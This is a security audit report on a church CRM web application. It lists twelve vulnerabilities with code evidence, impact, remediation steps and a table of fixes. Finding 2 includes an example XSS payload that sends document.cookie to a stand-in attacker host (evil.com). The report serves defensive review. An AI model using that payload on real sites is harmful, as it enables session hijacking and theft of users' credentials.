# Security Audit Report: Grace CRM

**Date:** January 13, 2026
**Auditor:** Security Assessment
**Application:** Grace CRM - Church Relationship Management System
**Version:** Current (commit 0e77278)

---

## Executive Summary

This security audit identified **12 vulnerabilities** across multiple severity levels. The Grace CRM application demonstrates good security practices in some areas (RLS database policies, role-based access control) but has critical issues requiring immediate attention, particularly around secrets management and XSS vulnerabilities.

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 4 |
| Medium | 3 |
| Low | 2 |

---

## Critical Vulnerabilities

### 1. Client-Side Storage of Secret API Keys (CRITICAL)
**Location:** `src/hooks/useChurchSettings.ts:24`, `src/contexts/IntegrationsContext.tsx`

**Description:** Stripe secret keys and other sensitive API credentials are stored in the database and accessed directly from the frontend client. The code explicitly acknowledges this issue with a comment: `// Note: In production, handle secret keys on backend only`

**Impact:**
- Full access to Stripe account (financial fraud, unauthorized transactions)
- Ability to send SMS/emails as the church (phishing, spam)
- Complete compromise of integration accounts

**Affected Credentials:**
- `stripeSecretKey` - Stripe payment processing
- `twilioAuthToken` - SMS sending capability
- `resendApiKey` - Email sending capability

**Evidence:**
```typescript
// src/hooks/useChurchSettings.ts:24
stripeSecretKey?: string; // Note: In production, handle secret keys on backend only
```

**Remediation:**
1. Move all secret key operations to a backend API
2. Never expose secret keys to the frontend
3. Use Stripe Elements/Checkout with publishable keys only
4. Implement server-side proxy for Twilio/Resend API calls

---

### 2. XSS via document.write with innerHTML (CRITICAL)
**Location:** `src/components/PrintableReports.tsx:33-62`

**Description:** User-controlled content is passed to `document.write()` using `innerHTML` without sanitization. This allows stored XSS attacks if person names, notes, or other fields contain malicious scripts.

**Impact:**
- Session hijacking via cookie theft
- Keylogging and credential theft
- Defacement and phishing attacks
- Full account takeover

**Evidence:**
```typescript
// src/components/PrintableReports.tsx:33
printWindow.document.write(`
  ...
  ${printContent.innerHTML}  // Unsanitized user content
  ...
`);
```

**Attack Vector:** An attacker could add a person with name: `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`

**Remediation:**
1. Sanitize all user content before rendering (use DOMPurify)
2. Use React's built-in JSX escaping instead of innerHTML
3. Implement Content Security Policy (CSP) headers
4. Consider using iframe sandbox for print preview

---

### 3. Demo Mode Authentication Bypass (CRITICAL)
**Location:** `src/contexts/AuthContext.tsx:214-258`

**Description:** When Clerk is not configured, the application automatically authenticates users as admin with full permissions. In production deployments where Clerk fails to initialize, this could grant unauthorized admin access.

**Evidence:**
```typescript
// src/contexts/AuthContext.tsx:229-245
function AuthProviderDemo({ children }: { children: React.ReactNode }) {
  const demoUser: User = {
    ...
    role: 'admin',  // Automatic admin access
  };

  const value: AuthContextType = {
    isLoaded: true,
    isSignedIn: true, // Auto sign-in for demo mode
    ...
  };
}
```

**Impact:**
- Complete application takeover if Clerk fails
- Access to all PII and financial data
- Ability to modify/delete all records

**Remediation:**
1. Remove demo mode from production builds
2. Use environment variable to explicitly enable demo mode
3. Fail closed - if auth fails, deny access rather than grant admin

---

## High Severity Vulnerabilities

### 4. Missing CSRF Protection (HIGH)
**Location:** `src/lib/services/auth.ts`, all fetch() calls

**Description:** API endpoints lack CSRF token validation. State-changing operations (invite, role update, delete) use simple fetch() without CSRF tokens.

**Evidence:**
```typescript
// src/lib/services/auth.ts:277
const response = await fetch('/api/auth/invite', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify(params),  // No CSRF token
});
```

**Impact:** An attacker can trick authenticated users into making unwanted requests.

**Remediation:**
1. Implement CSRF tokens for all state-changing requests
2. Use SameSite=Strict cookies
3. Validate Origin/Referer headers on backend

---

### 5. Insufficient Input Validation (HIGH)
**Location:** Multiple components handling user input

**Description:** User inputs (names, emails, phone numbers, notes) are not properly validated before storage or display. The SMS service attempts phone formatting but lacks comprehensive validation.

**Affected Areas:**
- Person creation/update forms
- Prayer request content
- Task descriptions
- Notes and interactions

**Remediation:**
1. Implement server-side input validation
2. Sanitize all text fields before storage
3. Validate email format, phone numbers
4. Limit field lengths
5. Escape special characters

---

### 6. Sensitive Data in localStorage (HIGH)
**Location:** `src/hooks/useChurchSettings.ts:64, 103`

**Description:** Church settings including API credentials are stored in localStorage in demo mode. localStorage is accessible to any JavaScript on the page and vulnerable to XSS.

**Evidence:**
```typescript
localStorage.setItem(`grace-crm-settings-${churchId}`, JSON.stringify(updatedSettings));
```

**Impact:**
- XSS can exfiltrate all stored credentials
- Credentials persist after logout
- Shared computer data leakage

**Remediation:**
1. Never store secrets in localStorage
2. Use secure, HttpOnly cookies for session data
3. Implement proper session management

---

### 7. Insecure Direct Object References (IDOR) (HIGH)
**Location:** `src/lib/services/auth.ts:312, 343`

**Description:** User operations use userId directly from client without verifying the requester has authority to modify that user.

**Evidence:**
```typescript
// src/lib/services/auth.ts:312
const response = await fetch(`/api/auth/users/${userId}/role`, {
  method: 'PATCH',
```

**Impact:** Users may be able to modify other users' roles or delete other users.

**Remediation:**
1. Verify user authorization on backend before any modification
2. Ensure users can only modify users in their organization
3. Implement proper access control checks

---

## Medium Severity Vulnerabilities

### 8. Inadequate Session Timeout (MEDIUM)
**Location:** `src/contexts/AuthContext.tsx`

**Description:** No session timeout is implemented. Sessions persist indefinitely, increasing the window for session hijacking.

**Remediation:**
1. Implement session timeout (e.g., 24 hours)
2. Force re-authentication for sensitive operations
3. Provide session management UI for users

---

### 9. Missing Rate Limiting (MEDIUM)
**Location:** All service endpoints

**Description:** No rate limiting on API calls for email/SMS sending, authentication attempts, or data operations.

**Impact:**
- Brute force attacks on authentication
- SMS/Email service abuse
- Resource exhaustion

**Remediation:**
1. Implement rate limiting on all endpoints
2. Add exponential backoff for failed auth attempts
3. Set quotas for SMS/email sending

---

### 10. Information Disclosure in Errors (MEDIUM)
**Location:** Multiple service files

**Description:** Error messages may expose stack traces or internal system details.

**Evidence:**
```typescript
error: error instanceof Error ? error.message : 'Unknown error occurred'
```

**Remediation:**
1. Log detailed errors server-side
2. Return generic error messages to clients
3. Implement proper error handling middleware

---

## Low Severity Vulnerabilities

### 11. Missing Security Headers (LOW)
**Location:** Application configuration

**Description:** Security headers (CSP, X-Frame-Options, X-Content-Type-Options) are not configured.

**Remediation:**
1. Add Content-Security-Policy header
2. Add X-Frame-Options: DENY
3. Add X-Content-Type-Options: nosniff
4. Add Referrer-Policy: strict-origin-when-cross-origin

---

### 12. Verbose Logging (LOW)
**Location:** Multiple files using `console.error()`

**Description:** Error logging may expose sensitive information in browser console.

**Remediation:**
1. Remove console logs in production
2. Use proper logging service
3. Sanitize logged data

---

## Security Strengths

The application demonstrates good security practices in several areas:

1. **Row-Level Security (RLS):** Database properly implements RLS policies for multi-tenant isolation using `church_id`.

2. **Role-Based Access Control:** Comprehensive RBAC system with 5 roles and granular permissions.

3. **Parameterized Queries:** Uses Supabase client which provides parameterized queries, preventing SQL injection.

4. **No Command Injection:** No shell execution or eval() usage found (except template string replacement).

5. **HTTPS for External APIs:** All third-party API calls use HTTPS.

---

## Recommendations Priority Matrix

| Priority | Vulnerability | Effort | Impact |
|----------|--------------|--------|--------|
| P0 | Move secrets to backend | High | Critical |
| P0 | Fix XSS in PrintableReports | Low | Critical |
| P0 | Remove/secure demo mode | Low | Critical |
| P1 | Add CSRF protection | Medium | High |
| P1 | Input validation | Medium | High |
| P1 | Secure credential storage | Medium | High |
| P1 | Fix IDOR vulnerabilities | Medium | High |
| P2 | Session timeout | Low | Medium |
| P2 | Rate limiting | Medium | Medium |
| P2 | Error handling | Low | Medium |
| P3 | Security headers | Low | Low |
| P3 | Logging cleanup | Low | Low |

---

## Immediate Actions Required

1. ~~**Do not deploy to production** until Critical and High issues are resolved~~ ✅ FIXED
2. Audit all existing data for potential XSS payloads
3. Rotate all API keys if they may have been exposed
4. Implement backend proxy for all third-party API calls (architecture change needed)
5. ~~Add comprehensive input sanitization~~ ✅ FIXED

---

## Fixes Implemented (Commit 4a3c7c8)

| Issue | Status | Fix Applied |
|-------|--------|-------------|
| XSS via document.write | ✅ Fixed | Added `sanitizeHtml()` to PrintableReports.tsx |
| Demo mode auth bypass | ✅ Fixed | Fail closed in production, require explicit opt-in |
| Missing CSRF protection | ✅ Fixed | Added `secureFetch()` with CSRF tokens |
| Missing security headers | ✅ Fixed | Added CSP, X-Frame-Options, etc. to vite config |
| Missing input validation | ✅ Fixed | Added validation utilities in `src/utils/validation.ts` |
| Secrets in localStorage warning | ✅ Fixed | Added security warnings and masked logging |
| Information disclosure | ✅ Fixed | Added `maskSensitiveData()` for logs |

### New Security Utilities Created
- `src/utils/security.ts` - Sanitization, CSRF, rate limiting, secure fetch
- `src/utils/validation.ts` - Input validation for forms

### Remaining Work (Architecture Changes Required)
- Move Stripe/Twilio/Resend secret keys to backend
- Implement server-side API proxy for third-party services
- Add session timeout mechanism
- Implement rate limiting on backend

---

## Appendix: Files Reviewed

- `src/contexts/AuthContext.tsx`
- `src/lib/services/auth.ts`
- `src/lib/services/email.ts`
- `src/lib/services/sms.ts`
- `src/lib/services/payments.ts`
- `src/hooks/useChurchSettings.ts`
- `src/contexts/IntegrationsContext.tsx`
- `src/components/PrintableReports.tsx`
- `src/components/Settings.tsx`
- `supabase/migrations/001_initial_schema.sql`
- `.env.example`

---

*This report is confidential and intended for authorized personnel only.*
